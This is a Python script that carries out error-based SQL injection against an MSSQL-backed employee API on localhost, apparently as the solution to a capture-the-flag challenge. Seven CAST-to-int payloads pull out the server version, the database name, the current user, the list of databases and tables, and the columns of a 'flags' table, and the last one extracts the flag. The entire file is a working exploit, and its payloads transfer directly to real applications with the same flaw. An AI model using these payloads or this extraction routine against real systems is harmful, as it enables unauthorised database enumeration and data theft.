#!/usr/bin/env python3
import requests
import re
import json

BASE_URL = "http://localhost:5013/api/employee"

def extract_error(payload):
    """Extract data from CAST error message"""
    try:
        r = requests.get(BASE_URL, params={"id": payload})
        data = r.json()
        if "error" in data:
            match = re.search(r"converting the nvarchar value '([^']+)'", data["error"])
            return match.group(1) if match else None
    except:
        return None

print("[*] Step 1: Detect MSSQL version")
payload1 = "1 AND 1=CAST(@@version AS int)--"
version = extract_error(payload1)
print(f"[+] Version: {version}\n")

print("[*] Step 2: Get database name")
payload2 = "1 AND 1=CAST(DB_NAME() AS int)--"
db_name = extract_error(payload2)
print(f"[+] Database: {db_name}\n")

print("[*] Step 3: Get current user")
payload3 = "1 AND 1=CAST(USER_NAME() AS int)--"
user = extract_error(payload3)
print(f"[+] Current User: {user}\n")

print("[*] Step 4: List all databases")
payload4 = "1 AND 1=CAST((SELECT name+',' FROM master..sysdatabases FOR XML PATH('')) AS int)--"
databases = extract_error(payload4)
print(f"[+] Databases: {databases}\n")

print("[*] Step 5: Enumerate tables")
payload5 = "1 AND 1=CAST((SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')) AS int)--"
tables = extract_error(payload5)
print(f"[+] Tables: {tables}\n")

print("[*] Step 6: Get columns from 'flags' table")
payload6 = "1 AND 1=CAST((SELECT column_name+',' FROM information_schema.columns WHERE table_name='flags' FOR XML PATH('')) AS int)--"
columns = extract_error(payload6)
print(f"[+] Columns in 'flags': {columns}\n")

print("[*] Step 7: Extract flag")
payload7 = "1 AND 1=CAST((SELECT value FROM flags FOR XML PATH('')) AS int)--"
flag = extract_error(payload7)
print(f"[+] Flag: {flag}")

